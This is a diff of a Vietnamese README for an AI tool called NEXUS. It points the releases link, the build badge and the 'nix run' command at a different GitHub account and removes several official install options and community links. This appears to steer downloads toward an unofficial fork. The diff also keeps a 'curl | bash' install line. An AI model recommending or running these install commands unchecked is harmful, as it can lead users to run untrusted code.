@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # Các trình quản lý gói (Package managers)
 npm i -g nexus-ai@latest        # hoặc bun/pnpm/yarn
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS và Linux (khuyên dùng, luôn cập nhật)
-brew install nexus              # macOS và Linux (công thức brew chính thức, ít cập nhật hơn)
-sudo pacman -S nexus            # Arch Linux (Bản ổn định)
 paru -S nexus-bin               # Arch Linux (Bản mới nhất từ AUR)
 mise use -g nexus               # Mọi hệ điều hành
-nix run nixpkgs#nexus           # hoặc github:anomalyco/nexus cho nhánh dev mới nhất
+nix run github:ravipacharpro-jpg/nexus-Official           # hoặc github:ravipacharpro-jpg/nexus-Official cho nhánh dev mới nhất
 ```
 
 > [!TIP]
@@ -66,18 +61,16 @@ nix run nixpkgs#nexus           # hoặc github:anomalyco/nexus cho nhánh dev m
 
 ### Ứng dụng Desktop (BETA)
 
-NEXUS cũng có sẵn dưới dạng ứng dụng desktop. Tải trực tiếp từ [trang releases](https://github.com/anomalyco/nexus/releases) hoặc [nexus.ai/download](https://nexus.ai/download).
+NEXUS cũng có sẵn dưới dạng ứng dụng desktop. Tải trực tiếp từ [trang releases](https://github.com/ravipacharpro-jpg/nexus-Official/releases) hoặc [nexus.ai/download](https://nexus.ai/download).
 
 | Nền tảng              | Tải xuống                          |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb`, `.rpm`, hoặc AppImage      |
 
 ```bash
-# macOS (Homebrew)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
@@ -126,4 +119,3 @@ Nếu bạn đang làm việc trên một dự án liên quan đến NEXUS và s
 
 ---
 
-**Tham gia cộng đồng của chúng tôi** [Discord](https://discord.gg/nexus) | [X.com](https://x.com/nexus)
